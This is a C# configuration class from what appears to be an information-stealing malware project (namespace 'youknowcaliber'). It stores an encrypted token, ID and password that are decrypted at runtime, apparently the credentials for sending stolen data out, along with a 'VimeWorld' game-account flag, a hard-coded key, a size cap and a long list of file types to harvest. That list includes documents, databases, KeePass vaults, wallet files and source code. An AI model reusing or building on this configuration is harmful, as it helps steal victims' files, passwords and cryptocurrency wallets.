﻿using System;

namespace youknowcaliber
{
	internal class Config
	{
		public static string Token = Crypt.DecryptConfig("ENCRYPTED:2S3sXywQY8Ej39E4U8irlCn6m1QcQbX5ZYz/N6dZlMojuf+lsPzwXPI4yVhirDD1");

		public static string ID = Crypt.DecryptConfig("ENCRYPTED:POh1TyLky4LDaM3Fli+8Bg==");

		public static string P0ass = Crypt.DecryptConfig("ENCRYPTED:5KUjzvChqaWoQmc71U50bw==");

		public static readonly bool VimeWorld = true;

		public static string key = "Ql9.9e";

		public static string[] extensions = new string[]
		{
			".pdf",
			".rtf",
			".doc",
			".docx",
			".xls",
			".xlsx",
			".ppt",
			".pptx",
			".indd",
			".txt",
			".json",
			".db",
			".db3",
			".db4",
			".kdb",
			".kdbx",
			".sql",
			".sqlite",
			".mdf",
			".mdb",
			".dsk",
			".dbf",
			".wallet",
			".ini",
			".c",
			".cs",
			".cpp",
			".asm",
			".sh",
			".py",
			".pyw",
			".html",
			".css",
			".php",
			".go",
			".js",
			".rb",
			".pl",
			".swift",
			".java",
			".kt",
			".kts",
			".ino",
			".jpg",
			".jpeg",
			".png",
			".bmp",
			".psd",
			".svg",
			".ai"
		};

		public static int sizefile = 1250000;
	}
}
